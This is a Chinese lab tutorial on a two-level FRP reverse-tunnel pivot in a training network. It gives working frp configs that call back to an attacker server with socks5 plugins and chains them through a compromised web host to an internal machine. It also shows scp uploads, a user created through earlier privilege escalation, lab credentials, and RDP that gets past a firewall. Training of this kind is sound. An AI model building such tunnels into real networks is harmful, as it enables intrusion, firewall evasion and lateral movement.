# Frp二级隧道代理

## 【实验目的】

通过使用frp代理工具进行二级隧道代理，成功代理到内网，了解并掌握二级隧道代理的原理，

## 【知识点】

FRP二级隧道代理

## 【实验原理】

FRP（Fast Reverse Proxy）是一种轻量级、高性能的反向代理工具，可用于内网穿透、安全访问和数据传输等场景。FRP由fatedier团队开发，采用Golang语言编写，支持跨平台部署和使用。FRP的原理是利用反向代理技术将公网请求转发至内网服务器上，并将内网服务器的响应再次转发至公网请求者。在实现内网穿透时，FRP能够将公网与内网之间的隔离突破，使得公网用户可以直接访问内网服务器上的资源，从而实现远程访问和管理。

## 【软件工具】

- 服务器：Windows Server 2008 1台；防火墙 1台；Centos 7 1台；Windows 10 2台；Windows 2016 1台；
- 交换机/路由：交换机 4台；路由器 1台；
- 软件：frp；SocksCap64

## 【实验拓扑】

![17060609263421698388755596538b6905139c](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500546.png)

## 【实验预期】

1.配置一级隧道代理
2.配置二级隧道代理，代理进入内网并绕过防火墙限制

## 【实验步骤】

### 1.一级隧道代理

#### （1）登录攻击机2-Windows

单击上方菜单栏中的【环境申请】按钮启动实验拓扑，选择拓扑图中左下方的【攻击机2-Windows】，按右键，在弹出的菜单中选择【控制台】，登录【攻击机2-Windows】界面。

![17060609263421698388755596538b6905139c](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500548.png)

依次双击打开桌面【工具】→【frp】文件夹。

![image-20240704091042415](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500549.png)

#### （2）配置攻击机frp服务端

双击打开【frps.ini】配置文件，输入以下参数内容并保存，编辑【frps.ini】配置文件配置本地服务端口7000。

```
[common]
server_port = 7000
```

![image-20240704091204668](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500550.png)

在【frp】此文件夹空白处，右键弹出菜单，单击选择【在此处打开命令提示符】。

![image-20240703150700675](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500551.png)

在命令提示符窗口中，输入以下命令，开启本地服务端代理监听7000端口。

```
frps -c frps.ini
```

![image-20240704091726936](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500552.png)

#### （2）上传frp并配置一级隧道frp的客户端

再次在【frp】此文件夹空白处，新建命令提示符终端，输入以下命令并按回车输入密码【Com.1234】，使用scp命令上传【frps】和【frpc】linux版的服务端和客户端文件至202.1.10.57的/bin目录。

```
scp frps frpc test@202.1.10.57:/bin
```

![image-20240704091838895](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500553.png)

> 注：由第六单元的6.2子任务，利用SUID方式提权添加test用户为root权限，密码为Com.1234。

输入以下命令并按下回车，远程连接目标服务器的SSH202.1.10.57服务器，ssh用户名为【test】，密码为【Com.1234】。如下图所示。

```
ssh test@202.1.10.57
```

![image-20240704091936036](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500554.png)

输入以下命令并按下回车，使用chmod命令给予【frps】和【frpc】两个文件执行权限。

```
chmod +x frps
chmod +x frpc
```

![image-20240704092018660](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500555.png)

输入以下命令并按下回车键，使用vim命令创建并编辑tmp根目录下的frpc.ini客户端配置文件。

```
vim /tmp/frpc.ini
```

![image-20240704092423911](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500556.png)

对frpc.ini文件进行编辑添加客户端的参数，按【i】键启用编辑模式，并输入以下配置参数，分别配置攻击机的IP与监听端口、配置本地socks5代理端口1080、配置给由本地10080端口转发至本地10088端口，再由本地10088端口转发到攻击机。

```
[common]
server_addr = 67.220.91.68     
server_port = 7000
 
[socks5-1]
type = tcp
remote_port = 1080
plugin = socks5
 
[socks5-33]
type = tcp
local_ip = 127.0.0.1
local_port = 10080
remote_port = 10088
```

![image-20240704092344933](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500557.png)

编辑完成后，按下【Esc】键，退出编辑模式，输入 【:wq】 命令并按下回车键，保存并退出文件编辑模式。

![image-20240704092404953](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500558.png)

#### （3）配置网站门户2的frp客户端

输入以下命令并按下回车，执行frpc客户端与服务端连接。

```
frpc -c /tmp/frpc.ini
```

![image-20240704092502129](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500559.png)

frps服务端开始响应，连接成功。

![image-20240704092521050](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500560.png)

### 2.二级隧道代理

#### （1）配置网站门户2的frp二级隧道服务端

桌面新建命令提示符终端，并远程连接目标服务器的SSH202.1.10.57服务器，输入以下命令并按下回车键，使用vim命令创建并编辑tmp根目录下的frps.ini客户端配置文件。

```
vim /tmp/frps.ini
```

![image-20240704093112709](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500561.png)

对frpc.ini文件进行编辑添加客户端的参数，按【i】键启用编辑模式，并输入以下配置参数，配置本地服务端口7000。

```
[common]
bind_port = 7000
```

![image-20240704092733236](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500562.png)

编辑完成后，按下【Esc】键，退出编辑模式，输入 【:wq】 命令并按下回车键，保存并退出文件编辑模式。

![image-20240704092404953](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500558.png)

输入ifconfig命令并按回车，得知门户网站2内网IP地址为【172.16.10.183】。

![image-20240704092945568](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500563.png)

输入以下命令并按下回车，在网站门户2中开启frp服务端程序。

```
frps -c /tmp/frps.ini
```

![image-20240704093232221](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500564.png)

#### （2）配置网站门户1的frp二级隧道客户端

双击打开在【工具】文件夹下的【frpc.ini】配置文件，输入以下参数内容并保存，编辑【frpc.ini】，分别配置反向连接门户网站2的服务端端口7000、使用socks5代理门户网站2的客户端端口10080。

```
[common]
server_addr = 172.16.10.183
server_port = 7000

[socks5-2]
type = tcp
plugin = socks5
remote_port = 10080  
```

![image-20240704093504020](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500565.png)

双击打开桌面上的远程桌面，单击【连接】按钮，连接目标202.1.10.34服务器。

![image-20240704093540426](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500566.png)

输入【test】的用户，密码为【Com.1234】。

![image-20240704093606478](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500568.png)

等待连接。

![image-20240704093619049](https://raw.githubusercontent.com/yuexuan521/image/main/20260417115500569.png)

进入远程桌面窗口，关闭服务器管理器窗口，复制【工具】文件夹的【frpc.exe】和【frpc.ini】两个文件到目标远程的桌面。



在桌面shift+右键弹出菜单，选择【在此处打开命令提示符】。



输入命令并按回车，在网站门户1中开启frp客户端程序。

```
frpc -c frpc.ini
```



#### （3）配置攻击机的socks客户端代理

依次双击打开桌面上的【工具】→【SocksCap64-4.7】文件夹，并双击打开【SocksCap64.exe】socks代理客户端软件。



> 注：打开SocksCap64.exe会有些慢。

弹出socks代理客户端软件窗口后，双击【代理】图标按钮，进入socks代理配置界面。



单击【+】按钮，配置【代理地址】为127.0.0.1，【端口】配置为10088，【代理类型】配置为SOCKS5，配置完成后，单击【保存】按钮。



#### （4）成功远程进入内网机器绕过防火墙限制

双击【远程桌面连接*32】图标。



弹出远程桌面连接窗口，单击【显示选项】按钮。



分别在计算机配置【10.0.18.22:1111】,用户名为【xiaowang@zhida.com】，完成后按回车，进入输入密码窗口。



> 注：在第八单元的8.2子任务中将LCX添加注册表启动项，由本地3389端口转发本地1111端口，绕过防火墙限制。

弹出密码窗口，输入【Xw@A0107.】并按回车。



等待目标远程连接。



单击【是】按钮。



弹出内网10.0.18.22窗口界面，成功使用frp多层代理，进入内网，绕过防火墙限制。



> 注：若无法进行远程桌面连接，可在攻击机的frp服务端窗口多次按下回车即可。



## 【实验结论】

通过上述操作，使用frp代理工具进行二级隧道代理，成功代理到内网，了解并掌握二级隧道代理的原理，符合实验预期。